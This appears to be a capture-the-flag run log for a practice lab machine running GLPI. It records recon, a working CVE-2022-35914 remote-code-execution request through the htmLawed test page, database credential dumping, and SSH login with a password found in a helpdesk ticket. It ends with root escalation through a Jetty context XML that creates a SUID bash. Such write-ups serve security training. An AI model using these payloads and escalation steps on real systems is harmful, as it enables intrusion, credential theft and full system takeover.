# GLPI (PG Practice, Fundamental, Linux) — run log

Target 192.168.248.242 · Kali 10.44.44.128 (tun0 192.168.45.207)

## Recon
- nmap `-p- -sCV`: only 22 (OpenSSH 8.2p1 Ubuntu) and 80 (Apache 2.4.41 Ubuntu). No UDP path needed.
- Port 80 = GLPI. Two independent version signals:
  - `/CHANGELOG.md` top entry `## [10.0.2] unreleased`
  - `/vendor/htmlawed/htmlawed/htmLawedTest.php` renders "htmLawed 1.2.6 test page" (the bundled vulnerable module)
- OS: Ubuntu 20.04.5 LTS, kernel 5.4.0-137.

## Foothold — CVE-2022-35914 (htmLawed test page RCE)
The naive public PoC `sid=foo&hhook=exec&text=<cmd>` did NOT work here: `exec()` is
disabled via php `disable_functions` on this box. Response processes the input (shows
hexdump of `text`) but no command output, no timing delay on `sleep`.

Working payload uses the `array_map` -> `call_user_func` -> `system` callback chain
(system/passthru still enabled; the htmLawed hook passes 3 args so a 3-arg-tolerant
routing is needed):
```
POST /vendor/htmlawed/htmlawed/htmLawedTest.php   Cookie: sid=foo
text=call_user_func&hhook=array_map&hfoo=system&spec[0]=&spec[1]=<CMD>&sid=foo
```
Mechanism: htmLawed calls `hook($text, $C, $S)` = `array_map('call_user_func', $C, $S)`
where `$C=['array_map','system']` (from hhook,hfoo) and `$S=[null,'<CMD>']` (from spec[]).
Iteration 2 = `call_user_func('system','<CMD>')`. Output echoes into the page after
the last `</form>`.

Confirmed: `uid=33(www-data)`.

## Post-foothold enumeration (www-data)
- `/var/www/glpi/config/config_db.php`: glpi / glpi_db_password
- `glpi_users` table dumped. betty bcrypt: `$2y$10$jG8/feTYsguxsnBqRG6.judCDSNHY4it8SgBTAHig9pMkfmMl9CFa` (realname berta)
- /home/betty/local.txt exists, mode -r--r----- betty:betty -> need betty
- Jetty 11.0.12 runs as ROOT (java, listening 8080). `/opt/jetty/jetty-base/webapps`
  is owned **betty:betty** -> betty can drop a context XML that Jetty deploys as root.
- www-data cannot write webapps (owned betty). sudo needs password. No SUID surprises.

## Cracking betty
`john betty.hash --wordlist=rockyou --format=bcrypt` (in progress)

## Becoming betty (resumed 2026-08-21)
Priority-ordered attack per handoff:
1. SSH cred reuse (`glpi_db_password`, `betty`, `berta`, `glpi`, `password`, `Betty2023`) — ALL failed. `sshpass ... PubkeyAuthentication=no` -> "Permission denied".
2. LDAP/mailcollector encrypted stores (glpi_authldaps / glpi_mailcollectors / glpi_configs) — EMPTY. `rootdn_passwd`, mailcollector `passwd` all blank; `smtp_passwd`/`proxy_passwd` = ''. glpicrypt.key readable but nothing to decrypt. **Handoff hypothesis #2 (most promising) was WRONG — no encrypted creds exist on this box.**
3. betty home readable files — `.bash_history -> /dev/null`, no `.ssh/`. Dead end.
4. GLPI logs/sessions — session files present (author session dumped, only prefs), event.log shows betty logins from 192.168.56.1. No creds.
5. **Full DB dump + grep = HIT.** `mysqldump glpi` then grep for password strings. Plaintext betty password sits in a helpdesk ticket followup:
   - `glpi_tickets` id 1 "Password Lost": betty asks Lucas for a new password ("finish the Jetty deployment").
   - `glpi_itilfollowups` id 1 (users_id 2 = glpi/Lucas): `i changed your password to : SnowboardSkateboardRoller234`

## betty -> user
`sshpass -p SnowboardSkateboardRoller234 ssh betty@192.168.248.242` -> interactive shell (tmux `glpibetty`).
- user proof captured -> `proof_user.txt`. flag `6d03f563ffa6d429d2c5f682d84f3d20`.
- Confirmed live: `/opt/jetty/jetty-base/webapps` owned betty:betty, Jetty (XmlConfiguration) proc owner = root, listening 8080.

## betty -> root (Jetty context-XML deploy)
- `scp root.xml -> /opt/jetty/jetty-base/webapps/root.xml`. Jetty deploy scanner picks up the ContextHandler descriptor within ~8s and runs `Runtime.exec` AS ROOT.
- Payload: `cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash` -> SUID root bash.
- `/tmp/rootbash -p -c 'cat /root/proof.txt'` -> `cbd9b70cece6cc1034f38803d1716d1e`. euid=0 confirmed. `proof_root.txt`.
- harvest.sh run as root -> `harvest_root.txt` (1338 lines).

## Notes on foothold detail (verified live)
- `disable_functions = exec,pcntl_*` — `exec` disabled, but `system`/`passthru`/`shell_exec` NOT. Explains why naive `hhook=exec` PoC returns no output while the `array_map->call_user_func->system` chain works. `disable_functions.txt`.

## Cleanup (all confirmed)
- removed `/opt/jetty/jetty-base/webapps/root.xml` (undeploys), `/tmp/rootbash`, `/tmp/.g.sql`, harvest temp dirs.
- Kali: killed old nc:443 listener (461615), john (461831), zombie watcher (462052); killed tmux `glpibetty`/`glpinmap`/`glpish` -> tmux server empty.

## Flags — DONE (2/2)
- user (local.txt): `6d03f563ffa6d429d2c5f682d84f3d20`  (proof_user.txt)
- root (proof.txt): `cbd9b70cece6cc1034f38803d1716d1e`  (proof_root.txt)
